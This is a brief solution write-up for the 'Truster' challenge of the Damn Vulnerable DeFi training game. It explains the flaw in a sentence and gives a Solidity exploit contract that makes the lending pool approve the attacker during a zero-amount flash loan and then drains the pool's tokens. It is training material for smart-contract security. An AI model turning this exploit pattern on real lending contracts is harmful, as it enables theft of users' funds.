# 02 Damn Vulnerable DeFi - Truster

https://www.damnvulnerabledefi.xyz/challenges/truster/


Key interaction is to approove token spending to exploit contract during flashLoan.

Exploit
```
contract Exploit {
    TrusterLenderPool trusterLenderPool;
    DamnValuableToken token;

    constructor(TrusterLenderPool _trusterLenderPool, DamnValuableToken _token) {
        trusterLenderPool = _trusterLenderPool;
        token = _token;
    }

    function exploit() external {
        bytes memory data = abi.encodeWithSignature(
            "approve(address,uint256)",
            address(this),
            token.balanceOf(address(trusterLenderPool))
        );

        trusterLenderPool.flashLoan(0, address(this), address(token), data);
        token.transferFrom(address(trusterLenderPool), address(this), token.balanceOf(address(trusterLenderPool)));
    }
}
```
